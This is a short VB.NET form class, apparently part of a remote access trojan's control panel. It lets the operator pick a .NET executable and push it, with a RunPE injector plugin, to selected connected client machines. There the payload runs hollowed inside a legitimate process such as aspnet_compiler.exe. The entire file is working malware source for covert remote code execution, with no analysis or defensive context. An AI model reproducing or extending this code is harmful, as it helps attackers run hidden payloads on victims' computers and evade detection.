Imports System.IO

Public Class RunPE
    Dim v4 As String = "C:\Windows\Microsoft.NET\Framework\v4.0.30319\"
    Dim v2 As String = "C:\Windows\Microsoft.NET\Framework\v2.0.50727\"

    Public FileB As Byte()
    Public TNET As String
    Private Sub RunPE_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ComboBox1.Text = "v4.0"
        ComboBox2.Text = "aspnet_compiler.exe"
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.Close()
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Try

            Dim o As New OpenFileDialog
            With o
                .Filter = "(*.exe)|*.exe"
                .Title = "Select .Net File"
            End With

            If o.ShowDialog = DialogResult.OK Then
                Try
                    System.Reflection.Assembly.LoadFile(o.FileName).EntryPoint.GetParameters()
                Catch
                    MessageBox.Show(o.FileName, "Is Not A .NET Assembly")
                    Return
                End Try

                FileB = IO.File.ReadAllBytes(o.FileName)

            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        If ComboBox1.Text = "v4.0" Then
            TNET = v4
        End If
        If ComboBox1.Text = "v2.0" Then
            TNET = v2
        End If
        Try
            If FileB Is Nothing Then
            Else
                Dim B As Byte() = SB("PE" & Settings.SPL & Convert.ToBase64String(File.ReadAllBytes("Plugins\RunPE.dll")) & Settings.SPL & TNET & ComboBox2.Text & Settings.SPL & Convert.ToBase64String(FileB))
                For Each C As ListViewItem In Form1.Lv1.SelectedItems
                    Dim ClientReq As New Outcoming_Requests(C.Tag, B)
                    Pending.Req_Out.Add(ClientReq)
                Next
                MessageBox.Show("DONE!")
                Me.Close()
            End If
        Catch ex As Exception
            MessageBox.Show(ex.Message)
        End Try
    End Sub
End Class